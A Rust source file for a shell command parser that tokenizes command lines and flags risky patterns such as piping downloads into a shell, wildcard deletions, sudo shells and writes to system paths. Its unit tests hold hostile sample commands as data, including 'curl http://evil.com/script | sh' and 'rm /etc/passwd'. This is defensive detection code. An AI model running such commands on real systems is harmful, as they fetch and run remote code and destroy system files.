use thiserror::Error;

#[derive(Error, Debug)]
#[allow(dead_code)]
pub enum ParseError {
    #[error("Unmatched quote character: {0}")]
    UnmatchedQuote(char),

    #[error("Unexpected end of input")]
    UnexpectedEnd,

    #[error("Invalid character escape: {0}")]
    InvalidEscape(char),

    #[error("Unmatched command substitution")]
    UnmatchedSubstitution,
}

#[derive(Debug, Clone, PartialEq)]
#[allow(dead_code)]
pub enum CommandElement {
    /// Simple command name or argument
    Word(String),

    /// Command substitution $(command) or `command`
    CommandSubstitution(Box<ParsedCommand>),

    /// Variable expansion $VAR or ${VAR}
    Variable(String),

    /// Input redirection < file
    InputRedirect(String),

    /// Output redirection > file or >> file
    OutputRedirect { file: String, append: bool },

    /// Error redirection 2> file
    ErrorRedirect(String),

    /// Pipe to another command
    Pipe(Box<ParsedCommand>),
}

#[derive(Debug, Clone, PartialEq)]
#[allow(dead_code)]
pub enum CommandConnector {
    /// Sequential execution (;)
    Sequential,

    /// AND execution (&&) - run next only if previous succeeds
    And,

    /// OR execution (||) - run next only if previous fails  
    Or,
}

#[derive(Debug, Clone, PartialEq)]
#[allow(dead_code)]
pub struct ParsedCommand {
    /// Main command and arguments
    pub elements: Vec<CommandElement>,

    /// Connected commands (chained with &&, ||, ;)
    pub connected_commands: Vec<(CommandConnector, ParsedCommand)>,
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct CommandParser {
    #[allow(dead_code)]
    strict_mode: bool,
}

#[allow(dead_code)]
impl CommandParser {
    pub fn new(strict_mode: bool) -> Self {
        Self { strict_mode }
    }

    /// Parse a shell command line into structured components
    pub fn parse(&self, input: &str) -> Result<ParsedCommand, ParseError> {
        let tokens = self.tokenize(input)?;
        self.parse_tokens(&tokens)
    }

    /// Get all executable commands from a parsed command (flattened)
    pub fn get_executable_commands(&self, cmd: &ParsedCommand) -> Vec<String> {
        let mut commands = Vec::new();

        // Extract main command
        if let Some(main_cmd) = self.extract_main_command(cmd) {
            commands.push(main_cmd);
        }

        // Extract commands from pipes and substitutions
        self.extract_nested_commands(&cmd.elements, &mut commands);

        // Extract commands from chained commands
        for (_, chained_cmd) in &cmd.connected_commands {
            commands.extend(self.get_executable_commands(chained_cmd));
        }

        commands
    }

    /// Get high-risk patterns that require special analysis
    pub fn get_risk_patterns(&self, cmd: &ParsedCommand) -> Vec<RiskPattern> {
        let mut patterns = Vec::new();

        // Check for pipe to shell execution
        if self.has_pipe_to_shell(cmd) {
            patterns.push(RiskPattern::PipeToShell);
        }

        // Check for command substitution with downloads
        if self.has_download_substitution(cmd) {
            patterns.push(RiskPattern::DownloadSubstitution);
        }

        // Check for mass operations with wildcards
        if self.has_wildcard_operations(cmd) {
            patterns.push(RiskPattern::WildcardMassOperation);
        }

        // Check for privilege escalation patterns
        if self.has_privilege_escalation(cmd) {
            patterns.push(RiskPattern::PrivilegeEscalation);
        }

        // Check for system path modifications
        if self.has_system_path_modification(cmd) {
            patterns.push(RiskPattern::SystemPathModification);
        }

        patterns
    }

    fn tokenize(&self, input: &str) -> Result<Vec<String>, ParseError> {
        let mut tokens = Vec::new();
        let mut current_token = String::new();
        let mut chars = input.chars().peekable();
        let mut in_quotes = false;
        let mut quote_char = '\0';

        while let Some(ch) = chars.next() {
            match ch {
                '"' | '\'' if !in_quotes => {
                    in_quotes = true;
                    quote_char = ch;
                }
                ch if in_quotes && ch == quote_char => {
                    in_quotes = false;
                }
                ' ' | '\t' | '\n' if !in_quotes => {
                    if !current_token.is_empty() {
                        tokens.push(current_token.clone());
                        current_token.clear();
                    }
                }
                '&' if !in_quotes && chars.peek() == Some(&'&') => {
                    chars.next(); // consume second &
                    if !current_token.is_empty() {
                        tokens.push(current_token.clone());
                        current_token.clear();
                    }
                    tokens.push("&&".to_string());
                }
                '|' if !in_quotes && chars.peek() == Some(&'|') => {
                    chars.next(); // consume second |
                    if !current_token.is_empty() {
                        tokens.push(current_token.clone());
                        current_token.clear();
                    }
                    tokens.push("||".to_string());
                }
                '|' if !in_quotes => {
                    if !current_token.is_empty() {
                        tokens.push(current_token.clone());
                        current_token.clear();
                    }
                    tokens.push("|".to_string());
                }
                ';' if !in_quotes => {
                    if !current_token.is_empty() {
                        tokens.push(current_token.clone());
                        current_token.clear();
                    }
                    tokens.push(";".to_string());
                }
                _ => {
                    current_token.push(ch);
                }
            }
        }

        if in_quotes {
            return Err(ParseError::UnmatchedQuote(quote_char));
        }

        if !current_token.is_empty() {
            tokens.push(current_token);
        }

        Ok(tokens)
    }

    fn parse_tokens(&self, tokens: &[String]) -> Result<ParsedCommand, ParseError> {
        let mut elements = Vec::new();
        let mut connected_commands = Vec::new();
        let mut i = 0;

        while i < tokens.len() {
            match tokens[i].as_str() {
                "&&" => {
                    i += 1;
                    let remaining_tokens = &tokens[i..];
                    let next_cmd = self.parse_tokens(remaining_tokens)?;
                    connected_commands.push((CommandConnector::And, next_cmd));
                    break;
                }
                "||" => {
                    i += 1;
                    let remaining_tokens = &tokens[i..];
                    let next_cmd = self.parse_tokens(remaining_tokens)?;
                    connected_commands.push((CommandConnector::Or, next_cmd));
                    break;
                }
                ";" => {
                    i += 1;
                    let remaining_tokens = &tokens[i..];
                    let next_cmd = self.parse_tokens(remaining_tokens)?;
                    connected_commands.push((CommandConnector::Sequential, next_cmd));
                    break;
                }
                "|" => {
                    i += 1;
                    let remaining_tokens = &tokens[i..];
                    let piped_cmd = self.parse_tokens(remaining_tokens)?;
                    elements.push(CommandElement::Pipe(Box::new(piped_cmd)));
                    break;
                }
                _ => {
                    let element = self.parse_word(&tokens[i])?;
                    elements.push(element);
                    i += 1;
                }
            }
        }

        Ok(ParsedCommand { elements, connected_commands })
    }

    fn parse_word(&self, word: &str) -> Result<CommandElement, ParseError> {
        // Check for command substitution FIRST (before variable expansion)
        if word.starts_with("$(") && word.ends_with(')') {
            let inner_cmd = &word[2..word.len() - 1];
            let inner_tokens = self.tokenize(inner_cmd)?;
            let parsed_cmd = self.parse_tokens(&inner_tokens)?;
            return Ok(CommandElement::CommandSubstitution(Box::new(parsed_cmd)));
        }

        // Check for backtick command substitution
        if word.starts_with('`') && word.ends_with('`') {
            let inner_cmd = &word[1..word.len() - 1];
            let inner_tokens = self.tokenize(inner_cmd)?;
            let parsed_cmd = self.parse_tokens(&inner_tokens)?;
            return Ok(CommandElement::CommandSubstitution(Box::new(parsed_cmd)));
        }

        // Check for variable expansion
        if let Some(stripped) = word.strip_prefix('$') {
            if word.starts_with("${") && word.ends_with('}') {
                let var_name = word[2..word.len() - 1].to_string();
                return Ok(CommandElement::Variable(var_name));
            } else if word.len() > 1 {
                let var_name = stripped.to_string();
                return Ok(CommandElement::Variable(var_name));
            }
        }

        // Check for redirections
        if let Some(stripped) = word.strip_prefix('<') {
            let file = stripped.to_string();
            return Ok(CommandElement::InputRedirect(file));
        }

        if let Some(stripped) = word.strip_prefix(">>") {
            let file = stripped.to_string();
            return Ok(CommandElement::OutputRedirect { file, append: true });
        }

        if let Some(stripped) = word.strip_prefix('>') {
            let file = stripped.to_string();
            return Ok(CommandElement::OutputRedirect { file, append: false });
        }

        if let Some(stripped) = word.strip_prefix("2>") {
            let file = stripped.to_string();
            return Ok(CommandElement::ErrorRedirect(file));
        }

        Ok(CommandElement::Word(word.to_string()))
    }

    fn extract_main_command(&self, cmd: &ParsedCommand) -> Option<String> {
        cmd.elements.first().and_then(|elem| {
            if let CommandElement::Word(word) = elem {
                Some(word.clone())
            } else {
                None
            }
        })
    }

    fn extract_nested_commands(&self, elements: &[CommandElement], commands: &mut Vec<String>) {
        for element in elements {
            match element {
                CommandElement::CommandSubstitution(cmd) => {
                    commands.extend(self.get_executable_commands(cmd));
                }
                CommandElement::Pipe(cmd) => {
                    commands.extend(self.get_executable_commands(cmd));
                }
                _ => {}
            }
        }
    }

    fn has_pipe_to_shell(&self, cmd: &ParsedCommand) -> bool {
        for element in &cmd.elements {
            if let CommandElement::Pipe(piped_cmd) = element {
                if let Some(shell_cmd) = self.extract_main_command(piped_cmd) {
                    if matches!(shell_cmd.as_str(), "sh" | "bash" | "zsh" | "fish") {
                        return true;
                    }
                }
            }
        }
        false
    }

    fn has_download_substitution(&self, cmd: &ParsedCommand) -> bool {
        self.find_download_in_substitutions(&cmd.elements)
    }

    fn find_download_in_substitutions(&self, elements: &[CommandElement]) -> bool {
        for element in elements {
            match element {
                CommandElement::CommandSubstitution(cmd) => {
                    if let Some(main_cmd) = self.extract_main_command(cmd) {
                        if matches!(main_cmd.as_str(), "curl" | "wget" | "lynx") {
                            return true;
                        }
                    }
                    if self.find_download_in_substitutions(&cmd.elements) {
                        return true;
                    }
                }
                CommandElement::Pipe(cmd) => {
                    if self.find_download_in_substitutions(&cmd.elements) {
                        return true;
                    }
                }
                _ => {}
            }
        }
        false
    }

    fn has_wildcard_operations(&self, cmd: &ParsedCommand) -> bool {
        if let Some(main_cmd) = self.extract_main_command(cmd) {
            if matches!(main_cmd.as_str(), "rm" | "chmod" | "chown" | "mv") {
                return cmd.elements.iter().any(|elem| {
                    if let CommandElement::Word(word) = elem {
                        word.contains('*') || word.contains('?') || word.contains('[')
                    } else {
                        false
                    }
                });
            }
        }
        false
    }

    fn has_privilege_escalation(&self, cmd: &ParsedCommand) -> bool {
        if let Some(main_cmd) = self.extract_main_command(cmd) {
            if main_cmd == "sudo" {
                // Check for sudo -s, sudo -i, etc.
                return cmd.elements.iter().any(|elem| {
                    if let CommandElement::Word(word) = elem {
                        matches!(word.as_str(), "-s" | "-i" | "--shell" | "--login")
                    } else {
                        false
                    }
                });
            }
        }
        false
    }

    fn has_system_path_modification(&self, cmd: &ParsedCommand) -> bool {
        let system_paths = ["/etc", "/boot", "/sys", "/proc", "/dev", "/usr", "/bin", "/sbin"];

        if let Some(main_cmd) = self.extract_main_command(cmd) {
            if matches!(main_cmd.as_str(), "rm" | "mv" | "cp" | "chmod" | "chown") {
                return cmd.elements.iter().any(|elem| {
                    if let CommandElement::Word(word) = elem {
                        system_paths.iter().any(|path| word.starts_with(path))
                    } else {
                        false
                    }
                }) || cmd.elements.iter().any(|elem| {
                    if let CommandElement::OutputRedirect { file, .. } = elem {
                        system_paths.iter().any(|path| file.starts_with(path))
                    } else {
                        false
                    }
                });
            }
        }
        false
    }
}

#[derive(Debug, Clone, PartialEq)]
#[allow(dead_code)]
pub enum RiskPattern {
    /// Command pipes output to shell for execution
    PipeToShell,

    /// Command substitution downloads and executes content
    DownloadSubstitution,

    /// Mass file operations using wildcards
    WildcardMassOperation,

    /// Privilege escalation to shell
    PrivilegeEscalation,

    /// Modification of system paths
    SystemPathModification,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_simple_command() {
        let parser = CommandParser::new(true);
        let result = parser.parse("ls -la").unwrap();

        assert_eq!(result.elements.len(), 2);
        assert_eq!(result.elements[0], CommandElement::Word("ls".to_string()));
        assert_eq!(result.elements[1], CommandElement::Word("-la".to_string()));
    }

    #[test]
    fn test_pipe_command() {
        let parser = CommandParser::new(true);
        let result = parser.parse("ls -la | grep test").unwrap();

        assert_eq!(result.elements.len(), 3);
        assert_eq!(result.elements[0], CommandElement::Word("ls".to_string()));
        assert_eq!(result.elements[1], CommandElement::Word("-la".to_string()));

        if let CommandElement::Pipe(piped_cmd) = &result.elements[2] {
            assert_eq!(piped_cmd.elements[0], CommandElement::Word("grep".to_string()));
            assert_eq!(piped_cmd.elements[1], CommandElement::Word("test".to_string()));
        } else {
            panic!("Expected pipe command");
        }
    }

    #[test]
    fn test_command_substitution() {
        let parser = CommandParser::new(true);
        let result = parser.parse("echo $(date)").unwrap();

        assert_eq!(result.elements.len(), 2);
        assert_eq!(result.elements[0], CommandElement::Word("echo".to_string()));

        if let CommandElement::CommandSubstitution(cmd) = &result.elements[1] {
            assert_eq!(cmd.elements[0], CommandElement::Word("date".to_string()));
        } else {
            panic!("Expected command substitution, got: {:?}", result.elements[1]);
        }
    }

    #[test]
    fn test_redirections() {
        let parser = CommandParser::new(true);
        let result = parser.parse("cat <input.txt >output.txt 2>error.log").unwrap();

        assert_eq!(result.elements.len(), 4);
        assert_eq!(result.elements[0], CommandElement::Word("cat".to_string()));
        assert_eq!(result.elements[1], CommandElement::InputRedirect("input.txt".to_string()));
        assert_eq!(
            result.elements[2],
            CommandElement::OutputRedirect { file: "output.txt".to_string(), append: false }
        );
        assert_eq!(result.elements[3], CommandElement::ErrorRedirect("error.log".to_string()));
    }

    #[test]
    fn test_risk_patterns() {
        let parser = CommandParser::new(true);

        // Test pipe to shell
        let result = parser.parse("curl http://evil.com/script | sh").unwrap();
        let patterns = parser.get_risk_patterns(&result);
        assert!(patterns.contains(&RiskPattern::PipeToShell));

        // Test wildcard operations
        let result = parser.parse("rm -rf *.txt").unwrap();
        let patterns = parser.get_risk_patterns(&result);
        assert!(patterns.contains(&RiskPattern::WildcardMassOperation));

        // Test privilege escalation
        let result = parser.parse("sudo -s").unwrap();
        let patterns = parser.get_risk_patterns(&result);
        assert!(patterns.contains(&RiskPattern::PrivilegeEscalation));

        // Test system path modification
        let result = parser.parse("rm /etc/passwd").unwrap();
        let patterns = parser.get_risk_patterns(&result);
        assert!(patterns.contains(&RiskPattern::SystemPathModification));
    }

    #[test]
    fn test_chained_commands() {
        let parser = CommandParser::new(true);
        let result = parser.parse("cd /tmp && rm -rf * || echo failed").unwrap();

        assert_eq!(result.elements.len(), 2);
        assert_eq!(result.connected_commands.len(), 1); // First command connects to second, which connects to third

        let (connector1, cmd1) = &result.connected_commands[0];
        assert_eq!(*connector1, CommandConnector::And);

        // The cmd1 should have its own connected command (||)
        assert_eq!(cmd1.elements[0], CommandElement::Word("rm".to_string()));
        assert_eq!(cmd1.connected_commands.len(), 1);

        let (connector2, cmd2) = &cmd1.connected_commands[0];
        assert_eq!(*connector2, CommandConnector::Or);
        assert_eq!(cmd2.elements[0], CommandElement::Word("echo".to_string()));
    }

    #[test]
    fn test_executable_commands() {
        let parser = CommandParser::new(true);
        let result = parser.parse("curl http://example.com | tar -xz && make install").unwrap();
        let commands = parser.get_executable_commands(&result);

        assert!(commands.contains(&"curl".to_string()));
        assert!(commands.contains(&"tar".to_string()));
        assert!(commands.contains(&"make".to_string()));
    }
}
